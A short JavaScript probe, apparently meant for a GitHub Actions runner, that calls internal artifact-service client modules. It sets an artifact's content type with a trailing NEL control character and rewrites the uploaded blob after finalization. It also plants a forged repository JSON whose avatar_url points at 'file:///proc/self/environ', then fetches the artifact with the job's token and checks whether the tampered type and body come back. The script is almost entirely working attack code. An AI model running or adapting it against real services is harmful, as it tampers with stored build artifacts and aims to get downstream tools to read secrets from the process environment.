import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const client = internalArtifactTwirpClient({maxAttempts: 1});
const backend = getBackendIdsFromToken();
const name = `trailing-nel-${process.env.GITHUB_RUN_ID}`;
const mime = 'application/json\u0085';
const result = {};
try {
  const made = await client.CreateArtifact({...backend, name, version:7,
    mimeType:StringValue.create({value:mime})});
  if (!made.ok) throw new Error('create-not-ok');
  const block = new BlobClient(made.signedUploadUrl).getBlockBlobClient();
  const placeholder = Buffer.from('{}');
  await block.uploadData(placeholder,{blobHTTPHeaders:{blobContentType:mime}});
  const done = await client.FinalizeArtifact({...backend,name,size:String(placeholder.length)});
  if (!done.ok) throw new Error('finalize-not-ok');
  const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${done.artifactId}/zip`;
  const body = Buffer.from(JSON.stringify({full_name:repository,
    owner:{login:'control',avatar_url:'file:///proc/self/environ'},
    description:'trailing-nel-marker',stargazers_count:0}));
  await block.uploadData(body,{blobHTTPHeaders:{blobContentType:mime}});
  const first=await fetch(`https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${done.artifactId}/zip`,
    {headers:{Authorization:`Bearer ${process.env.GITHUB_TOKEN}`,Accept:'application/vnd.github.v3+json',
              'User-Agent':'repo-cassette-trailing-nel-probe'},redirect:'manual'});
  const final=await fetch(first.headers.get('location'));
  const bytes=Buffer.from(await final.arrayBuffer()), type=final.headers.get('content-type')||'';
  Object.assign(result,{artifactId:String(done.artifactId),repository,firstStatus:first.status,
    finalStatus:final.status,typeCodePoints:Array.from(type,c=>c.codePointAt(0)),bodyMatches:bytes.equals(body)});
} catch(error) { result.error=String(error?.message||error).replace(/[\r\n]+/g,' ').slice(0,300); }
console.log('TRAILING_NEL_RESULT',JSON.stringify(result));
